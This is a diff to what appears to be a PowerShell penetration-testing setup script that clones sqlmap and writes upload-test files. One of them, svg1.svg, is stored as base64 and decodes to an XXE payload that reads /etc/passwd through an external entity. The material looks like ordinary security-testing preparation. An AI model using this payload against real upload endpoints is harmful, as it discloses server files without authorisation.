@@ -119,6 +119,23 @@ cd sqlmap
 git clone https://github.com/sqlmapproject/sqlmap.git
 
 #########################################################################################################################
+
+cd C:\tools
+mkdir UploadFiles
+cd UploadFiles
+
+$tablica = @(
+    @{nazwa_pliku="svg1.svg"; dane_base64="PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHN2ZyBbIDwhRU5USVRZIHBheSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI+IF0+Cjxzdmc+JnBheTs8L3N2Zz4K"},
+    @{nazwa_pliku="svg2.svg"; dane_base64="U29tZSBzYW1wbGUgdGV4dCAy"}
+)
+
+
+
+foreach ($element in $tablica) {
+    $bajty = [System.Convert]::FromBase64String($element.dane_base64)
+    [System.IO.File]::WriteAllBytes("C:\tools\UploadFiles\"+$element.nazwa_pliku, $bajty)
+}
+
 #########################################################################################################################
 #########################################################################################################################
 #########################################################################################################################
